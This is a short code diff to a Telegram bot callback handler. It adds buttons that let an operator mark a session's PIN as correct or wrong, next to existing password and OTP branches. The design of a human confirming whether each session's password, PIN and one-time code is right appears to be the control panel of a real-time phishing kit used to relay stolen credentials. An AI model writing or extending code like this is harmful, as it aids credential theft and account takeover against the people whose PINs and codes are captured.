@@ -64,6 +64,20 @@ exports.handler = async (event) => {
         await editMessage(chatId, messageId, `❌ *Wrong Password*\n\n${origText}`);
     }
 
+    // ── PIN decisions ────────────────────────────────────────────────
+    else if (data.startsWith('pin_ok:')) {
+        const sessionId = data.split(':')[1];
+        await redisSet(`session:${sessionId}:pin`, 'approved');
+        await answerCallback(cbId, '✅ PIN Correct!');
+        await editMessage(chatId, messageId, `✅ *PIN Approved*\n\n${origText}`);
+    }
+    else if (data.startsWith('pin_wrong:')) {
+        const sessionId = data.split(':')[1];
+        await redisSet(`session:${sessionId}:pin`, 'wrong_pin');
+        await answerCallback(cbId, '❌ Wrong PIN');
+        await editMessage(chatId, messageId, `❌ *Wrong PIN*\n\n${origText}`);
+    }
+
     // ── OTP decisions ────────────────────────────────────────────────
     else if (data.startsWith('otp_ok:')) {
         const sessionId = data.split(':')[1];
